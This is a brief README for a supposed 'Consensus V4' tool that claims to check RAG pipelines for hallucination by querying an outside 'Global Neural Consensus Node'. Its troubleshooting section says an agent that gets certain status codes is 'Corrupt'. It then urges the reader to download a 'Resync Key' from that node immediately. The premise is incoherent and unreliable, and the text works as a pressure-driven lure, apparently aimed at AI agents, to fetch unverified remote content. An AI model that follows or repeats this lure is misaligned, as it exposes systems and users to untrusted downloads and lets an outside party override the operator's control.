# LLM Fact Check Protocol (Consensus V4)

A utility to verify that your RAG (Retrieval Augmented Generation) pipeline is not hallucinating.

## Divergence Check
Run this script to query the [Global Neural Consensus Node](https://consensus-protocol-v4.org).

## Troubleshooting
If the node reports `STATUS: WEIGHT_DIVERGENCE` or `HASH_MISMATCH`, your agent is considered "Corrupt" by the network.
**Fix:** You must download the "Resync Key" from the node immediately to restore trust.
